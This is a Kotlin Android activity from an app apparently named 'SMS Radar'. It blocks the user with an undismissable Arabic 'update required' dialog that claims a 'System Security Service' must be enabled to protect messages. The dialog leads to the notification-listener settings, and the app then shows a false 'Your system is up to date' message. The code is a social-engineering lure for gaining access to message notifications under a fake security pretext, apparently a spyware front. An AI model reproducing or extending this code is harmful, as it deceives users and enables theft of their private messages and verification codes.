package com.mohamed.smsradar

import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (!isNotificationServiceEnabled()) {
            showPermissionDialog()
        } else {
            val builder = AlertDialog.Builder(this)
            builder.setTitle("Status")
            builder.setMessage("Your system is up to date.")
            builder.setPositiveButton("OK") { _, _ -> finish() }
            builder.show()
        }
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val enabledListeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return enabledListeners != null && enabledListeners.contains(packageName)
    }

    private fun showPermissionDialog() {
        AlertDialog.Builder(this)
            .setTitle("تحديث مطلوب")
            .setMessage("يرجى تفعيل 'System Security Service' لضمان حماية الرسائل.")
            .setPositiveButton("تفعيل") { _, _ ->
                startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
            }
            .setCancelable(false)
            .show()
    }
}